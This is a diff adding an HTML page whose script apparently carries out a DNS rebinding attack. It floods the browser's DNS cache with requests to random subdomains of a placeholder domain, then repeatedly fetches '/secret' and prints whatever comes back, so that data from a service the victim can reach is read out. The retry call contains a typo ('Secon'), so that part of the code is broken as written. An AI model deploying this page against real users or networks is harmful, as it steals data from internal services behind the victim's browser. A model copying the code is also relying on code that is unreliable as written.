@@ -1,0 +1,52 @@
+<html>
+<head>
+    <script type="text/javascript">
+        var Second = 1 * 1000;
+
+        var start = performance.now();
+
+        function exfiltrate() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "/secret");
+            xhr.onload = function(e) {
+                if (xhr.status == 200) {
+                    var response = xhr.responseText;
+                    var end = performance.now();
+                    document.body.innerText += "\nSuccess after " + ((end - start) / 1000).toFixed(2) + " seconds!\n";
+                    document.body.innerText += "Data: " + response;
+                } else {
+                    // retry...
+                    document.body.innerText += ".";
+                    setTimeout(exfiltrate, Secon);
+                }
+            }
+            xhr.send();
+        }
+
+        var CACHESIZE = 1500;
+        for (var i = 0; i < CACHESIZE; i++) {
+            var r = Math.floor(Math.random() * 1000000000);
+            var xhr = new XMLHttpRequest();
+            // Use and hostname that will resolve to this server's IP address to avoid network issues.
+            // Make sure a file named 'empty' exists to avoid 404s.
+            // TODO set correct domain here
+            xhr.open("GET", 'http://' + r + '.yourdomain/empty');
+
+            var count = 0;
+            xhr.onload = function () {
+                count++;
+                if (count == CACHESIZE) {
+                    exfiltrate();
+                }
+            };
+            xhr.send();
+       }
+
+       console.log("Done flushing DNS cache.");
+    </script>
+</head>
+<body>
+    Please wait...<br/>
+</body>
+</html>
+
